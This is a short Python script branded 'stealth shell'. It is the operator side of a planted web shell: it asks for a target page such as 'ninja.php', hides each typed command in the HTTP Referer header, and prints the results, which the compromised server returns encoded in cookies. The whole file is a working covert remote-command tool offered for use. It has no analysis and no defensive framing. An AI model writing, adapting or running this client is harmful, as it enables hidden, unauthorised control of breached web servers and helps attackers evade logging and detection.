import requests
from urllib.parse import unquote

print('''                                 
                    ,--,,-.----.    
  ,----..         ,--.'|\    /  \   
 /   /   \     ,--,  | :|   :    \  
|   :     : ,---.'|  : '|   |  .\ : 
.   |  ;. / |   | : _' |.   :  |: | 
.   ; /--`  :   : |.'  ||   |   \ : 
;   | ;  __ |   ' '  ; :|   : .   / 
|   : |.' .''   |  .'. |;   | |`-'  
.   | '_.' :|   | :  | '|   | ;     
'   ; : \  |'   : |  : ;:   ' |     
'   | '/  .'|   | '  ,/ :   : :     
|   :    /  ;   : ;--'  |   | :     
 \   \ .'   |   ,/      `---'.|     
  `---`     '---'         `---`     
  
  stealth shell
''')

def main():
    cmd = input("> ")
    r=requests.get(target, headers={"Referer":cmd})
    for c in r.cookies:
        print(unquote(c.value))
    main()


target = input("Target site (http://xxxxx.com/ninja.php) > ")
main()
